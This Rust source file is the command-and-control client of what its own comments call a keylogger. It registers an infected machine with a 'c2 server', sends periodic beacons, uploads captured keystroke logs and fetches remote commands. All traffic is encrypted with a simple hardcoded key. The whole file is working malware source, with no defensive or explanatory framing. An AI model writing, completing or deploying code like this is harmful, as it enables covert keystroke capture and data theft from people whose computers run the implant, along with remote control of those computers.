use serde_json::{json, Value};
use crate::encode::{self, EncodeConnection};
use rand::{rngs::StdRng, SeedableRng, Rng};

pub struct Connection<'a>{
    url: &'a str,
    reg: &'a str,
    becon: &'a str,
    upload: &'a str,
    command: &'a str,
    server: reqwest::Client,
    encoder: EncodeConnection
}


impl<'a> Connection<'a>{
    pub fn new(url : &'a str, key: u8) -> Connection<'a>{

        Connection{
            url:url,
            reg: "/register",
            becon: "/becon",
            upload: "/upload",
            command: "/command",
            server: reqwest::Client::new(),
            encoder: EncodeConnection::new( 42)
        }
    }


    //function that registers itself to the c2 server
    pub async fn register(&self, os:& str) -> Result<String, reqwest::Error> {
        let url = format!("{}{}",self.url,self.reg);

        let json_payload = json!({
            "OS": os,
            "key": self.encoder.get_key()
        });

        let payload = self.encode_json_payload(&json_payload, "");
        
        let response = self.server.post(url)
        .json(&payload)
        .send()
        .await?;

        Ok(response.text().await?)
    }

    //fiunction that sends a becon to the c2 server
    pub async fn becon(&self, id:& str) -> Result<String, reqwest::Error> {

        let url = format!("{}{}",self.url,self.becon);

        let json_payload = json!({
            "id": id,
            "timestamp":&chrono::Utc::now().to_string()
        });

        let payload = self.encode_json_payload(&json_payload, &id);

        let response = self.server.post(url)
        .json(& payload)
        .send()
        .await?;

        Ok(response.text().await?)
    }

    //function that sends the keylogged file to the c2 server
    pub async fn send_data(&self, id:& str, data: &String) -> Result<String, reqwest::Error> {

        let url = format!("{}{}",self.url,self.upload);

        let json_payload = json!({
            "id" : &id,
            "log": &data
        });

        let payload = self.encode_json_payload(&json_payload, &id);

        let response = self.server.post(url)
        .json(&payload)
        .send()
        .await?;

        Ok(response.text().await?)
    }

    //function that sends a get request to get commands
    pub async fn get_command(&self, id:& str,) -> Result<String, reqwest::Error> {

        let url = format!("{}{}",self.url,self.command);
        let params = [("id", id)];

        let response = self.server.get(url)
        .form(&params)
        .send()
        .await?;
        
        let decoded = self.encoder.decrypt(response.text().await?.as_str());
        
        match serde_json::from_str::<serde_json::Value>(decoded.as_str()) {

        Ok(val) => {
            let cmd = val["cmd"].as_str().unwrap_or("None").to_string();
            Ok(cmd)
        },
            Err(_) => Ok("None".to_string()),
    
        }

}

    fn encode_json_payload(&self, json_payload: &Value, id:& str) -> Value{
                
        let json_string = serde_json::to_string(&json_payload).unwrap();

        let encrypted = self.encoder.encrypt(&json_string);

        if id.is_empty(){
            
            json!({
                "data": encrypted
            })
        }else {
            json!({
                "id": id,
                "data": encrypted
            })
        }

    }
    
}
